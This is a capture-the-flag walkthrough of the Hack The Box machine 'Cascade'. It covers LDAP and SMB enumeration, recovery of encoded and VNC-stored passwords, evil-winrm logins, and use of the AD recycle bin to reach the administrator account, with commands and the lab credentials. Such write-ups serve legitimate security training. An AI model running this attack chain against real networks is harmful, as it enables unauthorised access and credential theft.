---
title: "Hack The Box - Cascade "
date: "Jul 10 2020"
subject: "Hack The Box - Cascade"
keywords: [Cascade, Hack The Box]
subtitle: "Cascade walkthrough"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Hack The Box Cascade Walktrough

### Information about the box 

IP address: 10.10.10.182

OS: Windows

Difficulty: Medium 

Release: Mar 28 2020
## Introduction

Cascade is a medium-rated machine on HacktheBox. It is an interesting box as it requires users to go through various enumeration to obtain the credentials and vulnerabilities of the machine. 

## Summary
To obtain the user flag, r.thompson's credentials is first used to login to smb to get the credentials of the user s.smith. Using the credentials of s.smith, a database file is found and is enumerated to get the credentials of Arksvc. Arksvc is then further enumerated to escalate to Administator account.

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.182      | **TCP**: 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49168


### Nmap Scan Results
Nmap scan is used to determined the ports that are open in the machine. <br>
```command: nmap -p- -A 10.10.10.182```<br>
 Explanation of the flags used: 
* -p-: scan ports from 1 through 65535 
* -A : Enable OS detection, version detection, script scanning, and traceroute
<br>The output of the scan: 
```

root@kali-linux:~/tst/hack-the-box--cascade# nmap -p- -A 10.10.10.182
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 13:48 +08
Nmap scan report for 10.10.10.182
Host is up (0.22s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-19 06:03:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m15s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-19T06:04:12
|_  start_date: 2020-07-17T12:04:44

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   220.03 ms 10.10.14.1
2   220.68 ms 10.10.10.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1016.38 seconds
```
Based on the nmap scan, smb, kerberos, ldap, RPC, WinRM and DNS is open. 

### LDAP enumeration
Since ldap is open, enumeration on ldap can be done on the machine to unncover any credentials. 

#### Using enum4linux 
enum4linux is used to enumerate infromation, such as Workgroup/Domain, from Windows and Samba systems. <br>
```command used: enum4linux -a 10.10.10.182``` <br>
 Explanation of the flags used: 
* -a: Do all simple enumeration
Domain name of the machine found: CASCADE <br>
![domain_name](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/domain_name.jpg)
#### Using ldapserch 
ldapsearch is used to enumerate for any credentials found in the ldap server. <br>
```command used: ldapsearch -h 10.10.10.182 -p 389 -x -b "dc=CASCADE,dc=local"```
 <br>Explanation of the flags used: 
* -h : Specify the host on which the ldap server is running
* -p : Specify the TCP port where the ldap server is listening.
* -x : Use simple authentication instead of SASL.
* -b : Use searchbase as the starting point for the search instead of the default.
<br>![ldap_result](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/ldapsearch_result.jpg)<br>
A username and password is found. However, the password is base64 encoded.
    - username: r.thompson 
    - password in base64: clk0bjVldmE=
        * To decode the password, command ```echo "clk0bjVldmE=" | base64 -d``` is used. 
        
**Credentials found using ldapsearch**
- username: r.thompson <br>
- password: rY4n5eva <br>
- email: r.thompson@cascade.local <br>

### SMB Enumeration 
Using the credentials of r.thompson, SMB enumeration can be done. <br>
Start by listing the shared folders view the shared folder of victim's machine. <br>
```command: smbclient -U "r.thompson" -L  \\\\10.10.10.182\\```
 <br>Explanation of the flags used: 
* -h : Specify the host on which the ldap server is running
* -L : List all the folders in the server
* -U : Set the SMB username 
<br>Output:
![smbclient_list](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/r.thompson/smbclient_list.jpg)
<br>
There are a couple of folders being shared but let's start with the Data folder.

##### Enumerating the Data folder
Logging in to r.thompson account to enumerate for credentials to compromise the machine since r.thompson is unable to access the machine remotely. After logging in, it is noticed that the IT folder is modified recently, thus, the folder will be enumerated first. In the folder, there are folders such as "Email Archives", "Logs" and "Temp", which might contain credentials of the other user that is able to access the machine remotely. <br>
```command: smbclient -U "r.thompson" \\\\10.10.10.182\\Data```
 <br>Explanation of the flags used: 
* -h : Specify the host on which the ldap server is running
* -U : Set the SMB username 
![r.thompson_smb](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/r.thompson/smbclient_login_to_data_and_cd_to_IT.jpg)
command: ```mget *``` is used to retrieve every file in the IT folder for enumeration. Once the files are retrieved, they will be enumerated starting from the folder that was modified most recently.
![retrieving files](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/r.thompson/smbclient_mget_all_folder.jpg)

##### Enumerating Logs folder 
There are 2 folders in the folder. <br>
1. Ark AD Recycle bin<br>
* There is a [log file](https://github.com/mashmllo/hack-the-box--cascade/blob/master/appendix/smbretrieve/Logs/Ark%20AD%20Recycle%20Bin/ArkAdRecycleBin.log) in this folder and another user is found. <br>
**username: ArkSvc** <br>
2. Dcs <br>
* Another log file is found but there is no credentails in the [log file.](https://github.com/mashmllo/hack-the-box--cascade/blob/master/appendix/smbretrieve/Logs/DCs/dcdiag.log)

##### Enumerating Temp folder
The Temp folder is enumerated next. Using the command *ls*, another user is found. 
![s.smith user found](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/second_user.jpg)

##### Enumerating s.smith folder in Temp file
A file, [VNC Install.reg](https://github.com/mashmllo/hack-the-box--cascade/tree/master/appendix/smbretrieve/Temp/s.smith/VNC%20Install.reg), was found. 
Using *cat 'VNC Install.reg'*, a password was found but it is encoded in hex. 
![hex_encoded_pass](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/found_pass_in_hex.jpg)
* password in hex: 6b,cf,2a,4b,6e,5a,ca,0f

###### Obtaining the vnc password
Since the hex encode is not the correct format for the [vnc password decrypter](https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/) to decrypt the password, the pasword has to be decoded into the vnc hash format. Since Kali linux is has base64 decoder installed, the vnc hash will be converted to be a base64 encode to ensure that the hash is not being altered while being transfered to a file to be decrypted. 
Steps taken to decode the password: <br>
1. convert from hex to base64 using an [online converter](https://base64.guru/converter/encode/hex).<br>
* password in base64: a88qS25ayg8=
![ouput of hash](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/user/s.smith/encode_to_base64.jpg) <br>
2. Convert the password from base64 to plaintext and store it into a file.<br>
```Command: echo "a88qS25ayg8=" | base64 -d > vncpasshash ```<br>
Now that the password is decoded into vnc hash, the [vncpassword decrypter](https://github.com/jeroennijhof/vncpwd) can now be used. <br>
Steps to decrypt the password: <br>
1. clone the git repository. <br>
* ```commmand: git clone https://github.com/jeroennijhof/vncpwd.git``` <br>
2. decompile the code as per the instruction shown <br>
* ```command: make``` <br>
3. run the command to decrypt the hash <br> 
* ```command: ./vncpwd ~/tst/hack-the-box--cascade/vncpasshash``` <br>
![decrypt](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/s.smith_passwd.jpg) <br>
**credentials of s.smith = s.smith:sT333ve2**

###### Checking if s.smith is able to access the machine remotely.
Going back to ldapsearch scan, it is shown that s.smith is able to access to machine remotely. 
![remote management](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/s.smith_ldap.jpg)

### Obtaining user flag

##### Exploit Windows Remote Management
Since the port for WinRM is open, a google search reveals the machine can be compromised using [evil-winrm](https://github.com/Hackplayers/evil-winrm). <br>
```command to download: gem install evil-winrm``` 

##### Access the machine remotely using the credentials found 
Once evil-winrm is downloaded, ``` command: evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2``` is used to access the Windows machine remotely. 
<br> Explanation of the flags used: 
* -i : Specify the Remote ip 
* -u : Specify the username
* -p : Specify the password  
<br> ![evil-winrm](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/evil-winrm_exploit%20.jpg)

##### Obtaining the user flag 
Using the command, ``` type C:\User\s.smith\Desktop\user.txt``` to obtain the user flag. <br>
![flag](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/user_flag.jpg)
### Privilege Escalation

#### SMB Enumeration 
From the previous enumeration using r.thompson account, it is shown that there was an Audit folder. <br>
![smbclient_list](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/user/r.thompson/smbclient_list.jpg) <br>
s.smith's credentials is used to access the Audit folder. In the folder, there is another folder named DB. When listing the content of the DB folder, a file, [Audit.db](https://github.com/mashmllo/hack-the-box--cascade/blob/master/appendix/smbretrieve/Audit.db), is found. The file is retrieved and enumerated. 
![audit folder](https://github.com/mashmllo/hack-the-box--cascade/blob/master/img/user/s.smith/retrieve%20db%20file%20from%20smb.jpg)

#### Audit.db enumeration 
Based on the .dll files in the audit folder, it is likely that Audit.db uses sqlite as its database. Therefore, sqlite3 is used. <br>
Steps to enumerate the database file: <br>
1. Use the ```command: sqlite3``` to access the interactive shell of sqlite
2. Attach the file using the command ``` attach "Audit.db" as db1;```
3. Using the command ```.databases``` to look for other databases available 
* Ouput: <br>
  ![databases command](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/arksvc/databases%20command.jpg) <br>
  Based on the output, Audit.db only has a single database
4. Using the command ``` .tables``` to find the names of the tables in the database 
* Ouput: <br>
  ![tables command](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/arksvc/tables%20command.jpg) <br>
  Based on the output, Audit.db has 3 tables namely, DeletedUserAudit, Ldap and Misc. 
5. Ldap table is first enumerated since the credentials obtained so far uses ldap. 
* ```command: select * from db1.Ldap;``` 
* A set of credentials is found
* Output: <br>
  ![credentials of ArkSvc](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/arksvc/credentials%20of%20Arksvc.jpg) <br>

##### Decrypting the hash 
Using an [online decrpyter](https://dotnetfiddle.net/2RDoWz), the password is decrpyted. <br>
![decryption](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/arksvc/online%20decrpyter%20.jpg) <br>
**Credentials of Arksvc = Arksvc:w3lc0meFr31nd**

#### Login to Arksvc using evil-winrm 
Use the command, ```command: evil-winrm -i 10.10.10.182-u Arksvc -p w3lc0meFr31nd``` to login to Arksvc's account. 
<br> Explanation of the flags used: 
* -i : Specify the Remote ip 
* -u : Specify the username
* -p : Specify the password  

By entering ```arksvc windows``` in google, a [webpage](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin) is shown suggesting that arksvc is a recycle bin for Active Directory to allow deleted files to be recovered easily. In the website, a command ```Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *``` is also given to allow users to return all of the deleted objects within a domain. By entering the command, user TempAdmin is found along with its encoded password. 
![TempAdmin_hash](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/hash%20of%20TempAdmin.jpg) <br>


##### Decoding TempAdmin's password 
Using base64, the password of TempAdmin is decoded. <br>
``` Command: echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d ``` <br>
![decode](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/hash%20of%20TempAdmin.jpg) <br>
**Credentials: TempAdmin:baCT3r1aN00dles**

#### Login to administrator's account using evil-winrm 
Use the command, ```command: evil-winrm -i 10.10.10.182-u  Administrator -p baCT3r1aN00dles``` to login to the administrator's account.
<br> Explanation of the flags used: 
* -i : Specify the Remote ip 
* -u : Specify the username
* -p : Specify the password  

Using the command ``` type C:\Users\Administrator\Desktop\root.txt``` to obtain the root flag.
![flag](https://github.com/mashmllo/hack-the-box--cascade/tree/master/img/PrivEsc/root%20flag.jpg) <br>

#### additional information about exploit used

##### ldap enumeration
 **Description** <br>
   The LDAP server in Active Directory in Microsoft Windows 2000 SP4 and Server 2003 SP1 and SP2 responds differently to a failed bind attempt depending on whether the user account exists and is permitted to login, which allows remote malicious users to enumerate valid usernames via a series of LDAP bind requests, as demonstrated by ldapuserenum.
 <br> **CVE id** <br>
   CVE id: CVE-2008-5112
 *Serverity*
   CVSS 3.0 score: 4.7 Medium 
   CVSS 2.0 score: 5.0 Medium

##### Weak Password used 
**Description** <br>
All of the password can be cracked using online tools or using wordlist provided. Moreover, the passwords are encoded in base64 which allows an attacker to decode it easily using a decoding tool. 
